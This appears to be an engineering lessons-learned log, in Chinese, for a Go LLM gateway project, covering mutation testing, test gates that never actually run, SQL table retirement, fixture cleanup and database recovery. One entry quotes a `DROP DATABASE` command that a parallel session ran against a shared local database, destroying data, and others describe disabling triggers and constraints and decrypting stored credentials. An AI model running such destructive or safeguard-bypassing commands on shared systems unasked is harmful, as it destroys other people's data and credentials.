     （「判据一旦能在注释里被满足，就不是判据」）—— 而 R68 写的新门**没有照做**
     ⇒ ⇒ ★ **纪律要靠「检索既有实现」来继承，不能靠记忆**：
     **写任何源码文本判据前，先 `grep` 整个仓里同类判据怎么做的**。
  2. ⭐⭐⭐⭐⭐ **「剥注释」还不等于「有牙」** ⇒ 剥完之后要问「这个 needle 还能被什么满足？」
     —— 本轮就是被**同函数体里的常量声明**满足的 ⇒ ⇒ **needle 要钉「形状」而不是「出现过」**。
  3. ⭐⭐⭐⭐ **提取「函数体」的规则本身会带进意外内容**（常量/类型/辅助函数都可能被吞进来）
     ⇒ 断言前要**逐个 needle 问「它还可能被谁满足」**。
  4. ⭐⭐⭐⭐ **剥注释器自己要被量**（两腿）：① 该剥的剥掉了；② **不该剥的没剥**
     （字符串字面量里的 `//`、原始字符串里的 `/* */`、rune `'/'`）
     ⇒ 仓内另几处是**正则**实现（不解析字面量）⇒ 遇到 URL 字面量会被吃掉
     ⇒ 本轮新写的实现是**状态机**（认得解释字符串/原始字符串/rune）⇒ 不剥过头。
  5. ⭐⭐⭐ **顺带的好处：needle 改成正则的「键值对形状」后，门对 `gofmt` 不再敏感**
     ⇒ 避免「钉源码字面形态 → 跑一次 gofmt 就假红」那类返工。
- 证据：`bg/candidate_failure_monitor_s4_stop_test.go`（2026-10-21 修复：剥注释 + 键值对形状 +
  `TestStripGoSourceCommentsKeepsCodeAndLiterals` 两腿自证）；
  `scripts/mutate-candidate-failure-monitor-classify-gate.py` 的 M5 变异
  （**修复前绿 ⇒ 门无牙；修复后红 ⇒ 门有牙**）。
- 溯源：R51 续轮（2026-10-21）。

## 2026-10-21 — ★★★★★ **共享仓的变异脚本必须用「隔离副本」**：就地改源文件的窗口里，别人的一次 commit 就能把改坏的源码推上 main（llm-gateway-go R51 续轮）

- 场景：本仓是**共享仓 + 并行会话**（实测 10 个会话并发）。存量的三份变异脚本
  （`mutate-s4-recorded-cost-skip-gate.py` / `mutate-tuning-view-coordination-gate.py` /
  `mutate-autoroute-index-sql-gate.py`）都是**就地改共享工作树**的源文件，
  跑一轮约 1~2 分钟。
- ⇒ ⇒ ★ **风险**：那个窗口里若并行会话恰好 `git commit -a` ⇒ **被故意改坏的那一行会被推上 main**
  ⇒ 那不是「一个脏文件」，那是**一个活着的缺陷**（同款前科：openpocket §941 —— 变异批次被中止后，
  被改坏的生产代码留在工作树上）。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **共享仓 + 并行会话 ⇒ 变异脚本默认形态应是「隔离副本」**：
     `git archive HEAD | tar -x -C <tmp>` 导出 HEAD（**`vendor/` 被 git 跟踪 ⇒ 副本可独立编译**）
     ⇒ **全部变异只在副本里发生**，共享工作树**一个字节都不动**；
     脚本收尾再核一次「共享工作树的已跟踪文件未被改动」。
  2. ⭐⭐⭐⭐ **前置条件要写进脚本**：副本来自 **HEAD** ⇒ 工作树里**已跟踪文件**若有未提交改动，
     副本就不是你以为的那棵树 ⇒ 脚本应当**先拒绝运行**（未跟踪文件 `??` 不算）。
  3. ⭐⭐⭐⭐ **锚点要钉「出现次数恰好等于 N」**（不是「>=1」）⇒ 本轮实测：`"source_max_failure_id", fid,`
     出现 **2 次**（WARN 分支 + ERROR 分支各一次）⇒ 那条变异必须两处同改。
  4. ⭐⭐⭐⭐ **变异脚本自己会骗人**（本轮同族第三次）：
     ① 第一版把两行**整行删掉** ⇒ `fid`/`rid` 变成未使用局部变量 ⇒ **build failed**
     ⇒ 「编译红 ≠ 断言红」⇒ 变异不合格 ⇒ **改外科式**（保留变量使用、只换字面量形状）才验得到真问题；
     ② 修好变异后，那条变异**仍然是绿的** ⇒ 这才轮到「**门没有牙**」这个结论。
     ⇒ ⇒ **顺序不能跳**：先排除「变异不合格」，再谈「门没牙」。
- 证据：`scripts/mutate-candidate-failure-monitor-classify-gate.py`（新，9 变异；
  收尾输出「OK 共享工作树的已跟踪文件未被改动」）；
  `bg/candidate_failure_monitor_s4_stop_test.go` 的 M5 变异
  （**第一版 build failed ⇒ 变异不合格；第二版绿 ⇒ 门无牙 ⇒ 修门后红**）。
- 溯源：R51 续轮（2026-10-21）。

## 2026-10-21 — ★★★★★ **DROP 类改动的验收面必须覆盖「运行时所有引用被删关系的路径」**：表名扫描抓不到「字符串常量里的 SQL」（llm-gateway-go R68）

- 场景：迁移 890 把 v1 族（表 + 分区 + 索引 + promote 函数）整体 DROP。**数据面**（读源）已全部切到会话族，
  但**运行时路径**里仍有三处引用被 DROP 的关系，分布在**三个不同的包**：
  ① `bg` 的 `rollupCredentialModelIndexSQL`（会话腿投影无别名 ⇒ 外层 `rl.credential_id` **42703** ⇒ autoroute 指标每 5s 停更）；
  ② `db` 的 848 ensure（`ALTER TABLE _request_logs`）；
  ③ `admin` 的 `hotPromoteTableMap`（自动 hot cron 每轮 **42883**）。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **「表名扫描」只覆盖 SQL 文件与视图体**；Go 里的 **SQL 字符串常量**（`const xxxSQL = `…`）、
     **map 值**（`hotPromoteTableMap`）、**模板拼接**（`fmt.Sprintf("SELECT %s(...)", fnName)`）都是**盲区**。
     ⇒ 退役/DROP 类的验收清单必须显式列出这三类载体。
  2. ⭐⭐⭐⭐ **"退役"要按"被删对象"逐个追**：890 不只删了**表**，还删了**函数**（promote_*）⇒ 凡是**按函数名调用**
     的代码（动态 SQL）也要一起追；本轮 ③ 就是"表没了、函数也没了、调用还在"。
  3. ⭐⭐⭐⭐ **注释会撒谎**：`promoteHotRetiredReason` 的注释写着「the automatic lifecycle job is gated the same way」，
     **其实没有**（手动路径查了、cron 路径没查）⇒ 注释不是证据，**代码路径才是**。
  4. ⭐⭐⭐⭐⭐ **纯文本形状门抓不到列解析错误**：`bg` 的既有门只数 `FROM session_turns_hot t` 出现次数、查
     `FROM _request_logs_hot` 是否消失 ⇒ 少一个别名照样绿 ⇒ **凡是"引用了别名列名"的 SQL 改写，必须配一道
     「真库执行门」**（显式事务 + ROLLBACK，零足迹）——形状门只能守形状，守不住语义。
- 证据：`bg/auto_index_refresher_rollup_realdb_test.go`（新，真库执行）、`bg/auto_index_refresher_rollup_alias_gate_test.go`（新，别名闭包）、
  `db/db_848_v1_family_guard_test.go`（新）、`admin/data_lifecycle_v1_retirement_test.go`（新）；
  变异 M1（去一个别名）⇒ 两道门同时红（静态门说"投影项没有别名"、真库门说 42703）⇒ sha256 还原。
- 溯源：R68 轮（2026-10-21）。

## 2026-10-21 — ★★★★★ **「注释与实现相反」的 helper 语义，会把「安全」变成巧合**（llm-gateway-go R68）

- 场景：`db.columnsAllPresent` 的注释写「表不存在 / 列缺失 / 探测出错 → **false**（走原 ensure 路径）」；
  **实现**把 `to_regclass(...) IS NOT NULL` 写在 `WHERE` 里 ⇒ 表不存在时 `missing=0` ⇒ 返回 **true**。
  ⇒ 而迁移 848 的 v1 DDL 安全（不 ALTER 已 DROP 的族）**恰恰靠这个"空真"** ⇒ 一旦有人按注释把它改成 false，
  **每次 boot 都 42P01、网关起不来**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **"安全"若压在一条"注释与实现相反"的语义上，它就是巧合而不是设计** ⇒ 修法不是"改注释"，
     而是**把承重语义搬到显式的地方**（848 自己探族在不在），**然后**再把注释订正成实现事实。
  2. ⭐⭐⭐⭐ **"表不存在 ⇒ true/valse"这类 helper 语义必须逐调用点枚举**：本轮 16 个调用点里，
     只有 848 依赖"空真"，其余目标表都在基线里存在 ⇒ 语义可改但要**先**把唯一的承重点拆掉。
  3. ⭐⭐⭐ **判据纪律**：helper 语义改动 ⇒ 先 grep 出全部调用点并分类，再改。
- 证据：`db/db.go`（注释订正 + 848 显式闸）、`db/db_848_v1_family_guard_test.go`（新）。
- 溯源：R68 轮（2026-10-21）。

## 2026-10-21 — ★★★★★ **共享本地环境的活库会被并行会话的一次性 ad-hoc 命令销毁；真库克隆脚本就是备份**（llm-gateway-go R68）

- 场景：21:57 另一并行会话执行 `DROP DATABASE IF EXISTS llm_gateway; CREATE DATABASE llm_gateway OWNER llm_gateway;`
  （3 次失败后强杀连接成功）⇒ 本地数据全丢（用户的网关 key、3 个上游凭据、provider_models 249、session_turns 1524）。
  **无 dump、无备份**。唯一救命稻草：一个真库回归脚本早前 `CREATE DATABASE ... TEMPLATE` 克隆出来的
  `itgate_sessfam_94339`（327 MB，131 张非空表）——**它就是旧环境的完整快照**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **真库回归脚本克隆源库时，源库即备份** ⇒ 克隆物**不要随手删**（脚本命名里的 `itgate_*` 与
     "用完即删"的直觉相冲突时，以"可恢复性"优先）。
  2. ⭐⭐⭐⭐⭐ **共享工作区 + 共享本地环境 ⇒ 活库随时可能被别的会话清空** ⇒ 动手改活库数据前，
     先确认**还有别的库能恢复它**；没有就先把源库克隆一份。
  3. ⭐⭐⭐⭐ **恢复手法（同实例）**：`postgres_fdw` 跨库搬运（`IMPORT FOREIGN SCHEMA … LIMIT TO`）⇒
     **服务器端 INSERT，无 COPY 转义问题、无 236MB 中转文件**；四件必做：
     **列交集（排除 `attgenerated`/identity）**、**`TRUNCATE … CASCADE` 后再搬**、
     **`SET session_replication_role = replica`（关触发器/外键/RLS）**、**排除两本台账**（`gateway_db_revision_sequences` / `schema_migrations`）。
  4. ⭐⭐⭐⭐ **量具坑三条**：① `psql` 的 `\restrict` 安全模式 —— PG 17 的明文 dump 首行带 token，
     **在 dump 前插任何 SQL** ⇒ token 失配 ⇒ psql 进受限模式 ⇒ **COPY 数据行被当命令**；② `2>/dev/null` 吞掉
     psql 错误 ⇒ "0 个关系"的**假读数**；③ 生成列不能显式插入。
  5. ⭐⭐⭐ **"删同 hash 行再插入"会打断 id 语义**：key 的 `id` 被运行实例的 keystore 快照引用 ⇒
     改 id ⇒ 预算检查按旧 id 查活表无行 ⇒ **fail-closed 503**；⇒ **复原数据要回到原 id**。
- 证据：`docs/audit/2026-10-20-R68-890后三处运行时残留与本地库灾后恢复.md` §1；读数：120/120 表逐表一致、1,008,708 行。
- 溯源：R68 轮（2026-10-21）。

## 2026-10-21 — ★★★★ **「上游返回空」先查上游，别先怀疑自己的改动**（llm-gateway-go R68）

- 场景：恢复后模型请求全部失败（`empty_response` / `no_candidate`）。逐层取证后，**根因全在上游**：
  sensenova **429**（tpm/rpm 限流）/ **403**（套餐不含该模型）/ **404**（模型不存在）、
  nvidia **410**（模型 2026-08-07 下线）/ vapeur **429**（组织余额不足）。
  而网关把「整段完成都进 `reasoning_content`、`content` 从未出现」判成空响应，是 **r1029 的既定裁决**（154 生产实证），
  不是缺陷 —— 把 `max_tokens` 从 16 放大到 600 后同一模型正常返回。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **恢复类事故里，「模型不通」几乎总是上游/凭据侧的事** ⇒ 用**直连上游**的工具（解密后自己发一次请求，
     只打印状态与响应体）把上游与网关两侧**切开**，再谈是不是自己的锅。
  2. ⭐⭐⭐⭐ **"空响应"要分三种**：① 上游真没内容；② 上游把内容放在 `reasoning_content`（预算被推理吃光 ⇒
     调大 `max_tokens` 即可）；③ 网关的分类规则（查 `internal/emptyoutcome` 的**裁决记录**，别凭直觉改）。
  3. ⭐⭐⭐ **别用"上游挂了"解释自己的失败**：每条失败都要有**状态码 + 响应体**的直连证据。
- 证据：R68 轮直连取证表（`docs/audit/2026-10-20-R68-890后三处运行时残留与本地库灾后恢复.md` §3.1）。
- 溯源：R68 轮（2026-10-21）。

## 2026-10-21 — ★★★★★ **「门绿」之前先问「它到底跑没跑」**：环境变量名不一致 / build tag ⇒ 那条断言从未执行（llm-gateway-go R68 · D3）
- 场景：v1 族退役后逐条改瞄 30 条 42P01 恒红门，改完跑「同一个包」以为都绿了。
- 实测翻车（两处，症状完全一样——**一条红的门消失了**）：
  ① `TestBudgetCheck_NonMissingRelationErrorKeeps500` 用 `reorderTestPool(t)`，
     它读的是 **`LLM_GATEWAY_PG_URL`**，而本仓所有真库腿都读 `TEST_DATABASE_URL`
     ⇒ 只设后者时它**永远 SKIP** ⇒ 「绿」是**空过**（两个变量都设才真跑 ⇒ PASS）；
  ② `TestSessionSummaryV2FallbackMatchesLegacyQueryOnRealRows` 带
     `//go:build integration` ⇒ 用 `-run` 过滤跑默认 tag 时它**根本没进读数**
     ⇒ 我一度以为「这条门不存在」。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **「红→绿」的第一嫌疑不是「修好了」，而是「没跑了」** ——
     ⇒ 每次都核：**这条测试名真的出现在 `-v` 输出里吗？**
  2. ⭐⭐⭐⭐ **同一仓里不同门可能用不同环境变量** ⇒ 跑真库腿要**把本仓用到的
     变量全列出来**（`rg 'os.Getenv\(".*(PG|DATABASE)' --glob '*_test.go'`），
     不是只设自己记得的那个；
  3. ⭐⭐⭐⭐ **带 build tag 的门要单独带 tag 跑一遍** ⇒ 否则它在默认跑法里
     **结构性不可见**（R57 已在另一处踩过同款：`TestStatsRebuildSQLParses`）；
  4. ⭐⭐⭐⭐ **「no tests to run」必须判作废，不能读成 PASS**（变异 harness 同款纪律）。
- 证据：`admin/keys_budget_test.go`（`reorderTestPool`）、
  `admin/routing_candidate_binding_test.go:298`（`LLM_GATEWAY_PG_URL`）、
  `admin/session_summary_v2_fallback_integration_test.go`（build tag）。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★★★ **族退役后的夹具不是「机械换表名」**：四个维度逐一对齐，否则门会变成恒绿（llm-gateway-go R68 · D3）
- 场景：v1 族（迁移 890）整体 DROP 后，30 条真库门全灭在 42P01 ⇒ 逐条改瞄会话族。
- 实测翻车（连着四次）：① 正文列名不是 `request_body`/`response_body` 而是
  **`request_delta`/`response_delta`**（照抄旧列名 ⇒ 42703）；
  ② `total_tokens` 在会话族是**派生**的（`NULLIF(prompt+completion,0)`），
  照抄旧种子的物理列值 ⇒ 读出来恒 0；
  ③ 唯一键从 `request_id` 变成 **`(tenant_id, session_id, turn_no)`**
  ⇒ 同 session 多行必须给不同 turn_no（固定 1 ⇒ 23505）；
  ④ 正文源的配对键从 `(request_id, ts)` 变成 **`request_id` 单键**且**源里没有 ts**
  ⇒ 旧形态不是「读不到」而是**解析期就不存在**（42703）。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **换族要核四个维度**：**列名 / 派生列 / 唯一键 / 配对键** ——
     少核一个就会出现「改了表名还是红」，而症状看起来像「夹具坏了」；
  2. ⭐⭐⭐⭐ **派生列的旧值不可照抄**（v1 的 `total_tokens` 是物理列，
     会话族是表达式）⇒ 种子要改成写**源列**，让读源自己算；
  3. ⭐⭐⭐⭐ **唯一键变了 ⇒ 夹具的「多行」构造法也要变**（v1 靠 request_id 区分，
     会话族靠 turn_no 区分）；
  4. ⭐⭐⭐⭐ **旧形态若已「结构上不可能」，就不是「读不到」而是「解析期报错」** ——
     ⇒ 这反而是好消息：失败方式从**静默**变成**响亮**。
- 证据：`docs/audit/2026-10-21-R68-D3-v1族退役后门改瞄.md` §3。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★★★ **契约变了，「只增不减」这类方向性不变式会从「保守」变成「有害」**（llm-gateway-go R68 · D3）
- 场景：`TestSessionSummaryV2FallbackMatchesLegacyQueryOnRealRows` 断言
  「legacy（元组键）配上的轮次 split（单键）必须配上同一份；legacy 没配上的轮次，
  split **可以**有正文」—— 这是**方向性**不变式，它成立的前提是
  **两条路径的配对键不同**。
- 实测翻车：族退役后两条路径用**同一个 request_id 单键 + 同一个源**
  ⇒ 「多取」不再是收益而是**串位**（把别的轮次的正文带进来）
  ⇒ 留着方向性断言 = **把 bug 钉成优点**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **方向性不变式（「只增不减」「至少有一边」）必须随契约一起复核** ——
     它的成立前提是「两条路径的机制不同」；机制一合，它就变成「多取即对」；
  2. ⭐⭐⭐⭐ 机制合流后的正确期望通常是**相等** ⇒ 改成相等性断言
     （轮次集合 / 编号 / 内容三条全在），不是**删掉**断言；
  3. ⭐⭐⭐⭐ **「多取」与「取错」在读数上都是「比期望多」** ⇒ 只有逐轮**内容相等**
     才区分得开（突变验证里「按下一轮取正文」正是这样被抓住的）。
- 证据：`admin/session_summary_v2_fallback_integration_test.go`（R68 改瞄）
  + 变异 M4（`mergeFallbackTurns` 串位 ⇒ 门红）。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★★ **幂等契约的「载体」可能随一次迁移一起消失**：断言「恰好 1 行」与「恰好 2 行」都会把错钉成对（llm-gateway-go R68 · D3）
- 场景：telemetry 的 `persistRequestLog` 原来同时写 v1 表（迁移 455 给了
  `UNIQUE(request_id)` + `ON CONFLICT` ⇒ 重投=刷新）与 `usage_ledger_hot`（纯 INSERT）。
  v1 族退役后**只剩后者**，而它的唯一键是 **`(request_id, ts)`**（迁移 344）、
  写入**不带 ON CONFLICT** ⇒ **实测重投 ⇒ 2 行**。
- 实测翻车：文档化的契约（「遥测 at-least-once ⇒ 同 request_id 重投=刷新而非重复行」，
  产品注释至今还写着）**当前无处兑现** ⇒ 而门只有两个选项，两个都错：
  断言「恰好 1 行」= 断言一条**当前不成立**的契约（恒红）；
  断言「恰好 2 行」= 把**重复计费**钉成契约（更糟：它会掩盖这个缺口）。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **门只能断言「当前为真且可观测」的东西** ⇒ 对未兑现的契约，
     正确做法是「断言可观测的那部分 + 把缺口登记给属主」，**不是**二选一硬断言；
  2. ⭐⭐⭐⭐ **区分「缺口是新引入的」与「缺口是老账」** ——
     本例 ledger 重复**不是** 890 引入的（890 之前也重复），
     变的是「**幂等语义载体**没了」⇒ 措辞不能写成「回归」；
  3. ⭐⭐⭐⭐ **修法若要动迁移 + 热写路径 ⇒ 属主拍板**，本轮只实测 + 留证 + 登记。
- 证据：`docs/audit/2026-10-21-R68-D3-v1族退役后门改瞄.md` §4.1
  （唯一键实测：`pg_indexes` 上 `usage_ledger_hot_request_id_ts_key`；
  行数实测：门内 `t.Logf("re-ingest 行数现状 = 2")`）。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★★ **默认值翻转会换掉「活路径」**：夹具种错表 ⇒ 读数全零 ⇒ 看起来像「夹具坏了」（llm-gateway-go R68 · D3）
- 场景：tenant stats 端点有两条读路径（raw union / daily rollup），
  由 `settings.RequestLogsWriteEnabled()` 选；该键默认在 890 之后被翻成 **false**
  ⇒ **活路径是 rollup**（`stats_usage_daily`），raw union 只在写门显式打开时可达。
- 实测翻车：按 raw union 的读源把种子种进 `session_turns_hot` ⇒
  端点返回的 daily 桶**全为 0**（`Requests:0 Success:0 Errors:0 Tokens:0 Credits:0 Cost:0`）
  ⇒ 第一反应是「夹具错了」；真相是**活路径换了**（rollup 表里没有这批数据）。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **「读数全零」的第一嫌疑是「读的不是那张表」**，不是「数据没种进去」
     ⇒ 先查**端点当前走哪条腿**（读产品源码里的分支条件 + 那个条件的**默认值**）；
  2. ⭐⭐⭐⭐ **默认值是被迁移悄悄改掉的**（一个 setting 的默认翻转 ⇒ 一整族读点换源）
     ⇒ 改瞄夹具前必须核「分支条件的当前默认值」，不能沿用旧轮的印象；
  3. ⭐⭐⭐⭐ ★ **顺带发现**：换路径后 raw union 那条腿**默认无人覆盖**
     ⇒ 「会话族两臂 union」的正确性在默认跑法下**没有门** ⇒ 登记为遗留。
- 证据：`admin/tenant_stats_rollup.go`（`tryTenantStatsFromDailyRollup`）、
  `settings/key_request_logs_write_enabled.go:44`（默认 false）、
  `admin/tenant_stats_daily_live_test.go`（R68 改瞄 + 变异 M5 验证有牙）。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★ **变异锚点必须核「恰好 1 次」**：源串出现两次时，锚点会「恰好匹配 2 处」⇒ 变异作废（llm-gateway-go R68 · D3）
- 场景：变异 harness 用「把源串替换成别的」制造语义变异，脚本里写
  `assert s.count(old)==1`。
- 实测翻车：会话族正文源串在 `admin/logs.go` 里**出现 2 次**
  （`fetchSessionOutboundBody` 与 `fetchRequestBodies` 都用它）
  ⇒ assert 失败 ⇒ 变异作废（**脚本没有乱改**，这点是对的）
  ⇒ 改成「取**第 2 次**出现」才做出语义正确的变异（只改 `fetchRequestBodies` 那处）。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐ **锚点「恰好一次」是纪律，但「出现两次」是常态** ——
     ⇒ 变异脚本应支持「取第 N 次」/「取最后一次」，而不是只支持「唯一」；
  2. ⭐⭐⭐⭐ ★ **「锚点匹配数不是 1」= 变异作废，不是「变异无效」**
     ⇒ 读数要判**作废**并重做（别把它读成「门没牙」）；
  3. ⭐⭐⭐⭐ 语义变异必须**只改目标函数**：同文件里同源的另一个调用点不能被连带改到
     （否则红灯可能来自别处 ⇒ 门有牙的结论不可信）。
- 证据：R68 变异 harness `/tmp/r68/mutate_r68.sh`（M1 第一版作废 → 改锚后变红）。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★★★★ **破坏性夹具的「还原」必须注册在破坏动作之前**：否则一次失败就把共享真库毒化（llm-gateway-go R68 · D3）
- 场景：一条真库门的形态是「把**真视图**改名走 → 建一个坏视图 → 断言 → 还原」，
  还原写成 `t.Cleanup(...)` **注册在 `CREATE VIEW` 之后**。
- 实测翻车：旧版夹具的 `CREATE VIEW` 带一个不存在的列 ⇒ PG **在建视图时就校验列引用**
  ⇒ 42703 ⇒ `t.Fatalf` ⇒ ★ **还原从未注册** ⇒ **真视图被永久改名走**
  ⇒ 之后每一次跑这条门都在第一步 42P01（`rename view: relation does not exist`）
  ⇒ 门变**永久红**，而且**把共享真库留在坏状态**。
  ★ 本轮的一次性库就是这样被毒化的 ⇒ 症状（同一处 42P01 连着出现）
  把「夹具其实已经修好、这条门本该是绿的」完全掩盖了。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **`t.Cleanup` 的注册点 = 承诺点** ⇒ **承诺必须先于风险**；
     破坏性夹具一律「先注册还原，再动手破坏」；
  2. ⭐⭐⭐⭐ **还原要条件化**（只有备份对象确实存在才动手）——
     否则「破坏压根没发生」时去 DROP 真对象 = **把可修的坏状态变成不可修的**；
  3. ⭐⭐⭐⭐ **破坏共享真库的门 ⇒ 复跑要验证「跑完库还是好的」**
     （连跑两遍 + 查 `information_schema.views` ⇒ 可重入）；
  4. ⭐⭐⭐⭐★★ **「同一处错误连着出现」的第一嫌疑是「环境被前一轮毒化」**，
     不是「被测对象坏了」⇒ 先查库的状态，再判代码；
  5. ⭐⭐⭐⭐ **改夹具时留意「它此前是不是必然失败」** ——
     一个必然失败的夹具会把「还原路径」变成**从未被走过的死代码**
     ⇒ 本轮把夹具改对（让 CREATE 能成功）之后，**还原路径才第一次真的被走**
     ⇒ 它的缺陷才暴露出来（★ 这就是「先量后建门」的另一个收益：
     修好一条夹具可能顺带让一条死代码复活成活缺陷）。
- 证据：`admin/keys_budget_test.go`（R68 改瞄：还原前置 + 条件化）、
  `docs/audit/2026-10-21-R68-D3-v1族退役后门改瞄.md` §4.6。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18。

## 2026-10-21 — ★★★★★ **「基线失败更多」的第一嫌疑是「基线把环境搞坏了」，不是「基线更差」**（llm-gateway-go R68 · D3）
- 场景：用「基线树 vs 本轮树，同一批包、同一个库」做**包级前后对比**，
  读数是 **39 ⇒ 12**，于是写下「修掉 30 条」。
- 实测翻车：★ **基线侧的 39 里有 2 条是被前一轮毒化的库连坐出来的**
  （基线自己跑的是**未修还原顺序**的破坏性夹具 ⇒ 它在跑的过程中把真视图改名走
  ⇒ 之后每跑必 42P01）⇒ ★ **那 2 条不是「基线更差」，是「基线把环境搞坏了」**。
  ★★ 而且更要命的是：**基线与本轮树跑在同一个共享真库上**
  ⇒ ⇒ **基线把库搞坏 ⇒ 本轮那次读数也是被污染的** ⇒ ⇒ **差集不可归因**。
- 真正的读数（三个隔离树、同一个**健康**库）：
  基线树 **37** ⇒ D3 提交树 **12** ⇒ 当前 HEAD 树 **12** ⇒ **修掉 25 条、新增 0 条**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **基线侧必须覆盖「被测对象侧的任何修」** ——
     否则基线自己会污染环境 ⇒ 前后两次读数都不可信；
     ⇒ ★ **复测前先查环境**（对象在不在、名字对不对），再跑。
  2. ⭐⭐⭐⭐⭐ **差集只能用于「同一族、同一层」** ⇒ 不可归因的条目要**单独列出来**：
     本轮就有 2 条（基线就绿 / 带 `//go:build integration` 不在默认读数里）
     ⇒ 「修掉 N 条」若不拆开，就会被读成「N 条都是这轮修的」。
  3. ⭐⭐⭐⭐ **「差集出现新增」时，先查环境再查被测对象** ——
     新增可能是**别人（基线）造成的**，不是「我这轮改坏了」。
  4. ⭐⭐⭐⭐ **「基线更高」与「本轮更低」都要重新量一遍**：
     ★ 一个**自己会污染环境**的基线，会让**整张对比表**失去意义
     ⇒ 宁可多跑一遍隔离树，也别把不可归因的数字写进结论。
  5. ⭐⭐⭐ **带 build tag 的门不在默认包读数里** ⇒
     「它没出现在差集里」≠「没修」⇒ 必须单独带 tag 跑并单独记。
- 证据：`/tmp/r68/base2_fails.txt`（37）vs `/tmp/r68/after2_fails.txt`（12）vs
  `/tmp/r68/head2_fails.txt`（12）；旧读数 `/tmp/r68/base_fails.txt`（39，被污染）。
- 溯源：llm-gateway-go R68 轮（D3 侧），§19.18.2 + 审计文档 §7.1/§7.2。
## 2026-10-21 §143.36 轮 — 「结构性成本」的根因常常不是「数据太宽」，而是「同一份数据被扫了两遍」（Seen: 1/3）

- 场景：P12「外传守卫」2 天累计 18,876.9 MB 物理读、每次 7,065 块、max 29,524 ms
  （撞 30 s `statement_timeout`）。既有判词把它归为「外传守卫（请求热路径）」。
- ★★★★★ **第一步就推翻了归属**：取 `pg_stat_statements.query` 的**逐字原文**
  ⇒ 与仓内 `admin/dashboard_board_fallback.go` 的 `fillOverviewCountsFromLogs`
  **骨架序列 21,135 字符逐字相等** ⇒ 它是**看板降级读面**，**不在请求热路径上**
  ⇒ ★★ **「因为在请求热路径上所以更敏感」这条优先级理由不成立**。
- ★★★★★ **第二步推翻了根因**：形态是**顶层 2 个标量子查询** ⇒ 同一份派生表
  **被独立扫描 2 遍**（一次调用 = 4 次会话族扫描）。
  ⇒ ★★★ **★ 把 118 列投影裁成 9 列【零收益】**（buffers 100.0% / 100.9%）
  ⇒ 因为 **planner 已经把未引用的投影列裁掉了**（EXPLAIN 里 `width` 700 → 40）
  ⇒ ⇒ **「数据太宽」这个根因是错的** ⇒ **裁剪投影这条路不要再走**。
- ⇒ ⇒ ★★★★ **改单遍**（一次扫描同时算两个 `COUNT(DISTINCT)`）⇒
  ★★★ **零语义风险**（`COUNT(DISTINCT x)` **按定义忽略 NULL** ⇒ 改前那两条
  `… IS NOT NULL` 尾臂是 **no-op** ⇒ **逐值**相等，不是「大概相等」）
  ⇒ 生产实测 30 天窗 **2,827,731 块 / 37,328 ms → 1,426,254 块 / 4,587 ms**
  ⇒ buffers **50.4%**、exec **−87.7%** ⇒ ★★ **「2 天 69 次被超时杀」的物理原因也一并解释了**
  （它本来就跑不完 30 s）。
- 通用式：
  ① ⭐⭐⭐⭐⭐ **判「结构性成本高」的根因，先问「同一份数据被读了几遍」** ——
     **N 遍 ⇒ 读数就是 N 倍**；而「列太宽」在 planner 已裁列时**读数完全不变**。
     ⇒ ★ **判别动作**：把查询改成「只投影外层真正用到的列」再测一次 ——
     **读数不变 ⇒ 根因不是列宽**（这正是本轮排除裁剪投影的手段）。
  ② ⭐⭐⭐⭐⭐ **「顶层 N 个标量子查询」= 「同一份派生表被扫 N 遍」** ——
     这是**最容易被忽略的形状**：结果完全正确、无任何报错，只是物理读翻倍。
     ⇒ **门要数「派生表占位符被引用了几次」，不能数「FROM」「SELECT」这类关键词**
     （改前改后数字巧合接近）。
  ③ ⭐⭐⭐⭐ **「改形态」类修法优先找【数学上逐值等价】的那一个** ——
     `COUNT(DISTINCT)` 忽略 NULL ⇒ 「把 `IS NOT NULL` 尾臂去掉」**不是**近似，
     是**恒等**。⇒ ★ 但这条许可**不可外推**到 `SUM`/`AVG`/`COUNT(*)`（对 NULL 敏感）
     ⇒ 门要钉住「聚合仍是 DISTINCT 形态」。
  ④ ⭐⭐⭐⭐ **A/B 的主判据要选【不受负载影响】的量** ——
     本轮 Exec 中位：current 129.8 ms（组内极差 **175.3**）、single 65.0 ms（极差 **192.6**）
     ⇒ ★★ **组内极差 > 组间差** ⇒ **时间不可作主判据** ⇒ 取 **buffers**（确定性量）。
  ⑤ ⭐⭐⭐⭐ **门的判据口径本身就是量具，量具也会有 bug** ——
     本轮门首版连红 3 处，**全是量具错、产品是对的**：
     (a) `strings.Index(body, "fmt.Sprintf(`")` **先命中 `modelExpr`**（它在前）
     ⇒ 必须遍历所有反引号模板、挑含 `SELECT` 的那个；
     (b) 「数 `FROM %s`」按**文件**计数会**恒红**（同文件另有两个正常单扫读面）
     ⇒ 必须**限定在同一个 SQL 模板内**；
     (c) 门自己的 .go 文件含这些字面量 ⇒ 扫描时必须**排除自己**。
     ⇒ ⇒ **★ 门红先问「是产物坏了还是量具口径错了」**（本轮第三次复现这条）。
